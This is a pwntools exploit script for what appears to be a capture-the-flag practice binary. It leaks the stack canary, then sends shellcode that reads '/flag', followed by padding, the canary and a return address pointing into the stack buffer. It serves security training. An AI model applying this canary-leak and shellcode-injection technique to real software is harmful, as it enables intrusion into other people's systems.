from pwn import *

# initialization
context.arch = 'amd64'
context.endian = 'little'
elf = ELF("/challenge/toddlerone_level4.0")
io = elf.process()

# Vars
distance_canary = 16 #0x10
distance_buffer = 120 #0x78
distance_between_buffer_and_canary = distance_buffer - distance_canary
distance_local_18 = 24 #0x18

# Leak the canary
io.recvuntil("size:")
io.sendline(f'{distance_between_buffer_and_canary + 1}')
io.recvuntil("bytes)!")

payload_first_run = b'A' * (distance_between_buffer_and_canary - 6) + b'REPEATZ'
io.sendline(payload_first_run)

io.recvuntil(b'REPEATZ')
canary = b'\x00' + io.recvline().strip()[:7]

# Exploit
io.readuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)

io.recvuntil("size:")
io.sendline(str(distance_buffer + 8))


shellcode = asm(shellcraft.cat('/flag'))
print("Shellcode length: " + str(len(shellcode)))
local_18 = p64(0xf19699f97eeb4a96)
payload_second_run = shellcode + b'A'*(distance_between_buffer_and_canary - len(shellcode) - 8) + local_18 + canary + p64(0x0) + p64(buffer_addr)

io.recvuntil("bytes)!")
io.sendline(payload_second_run)
io.interactive()
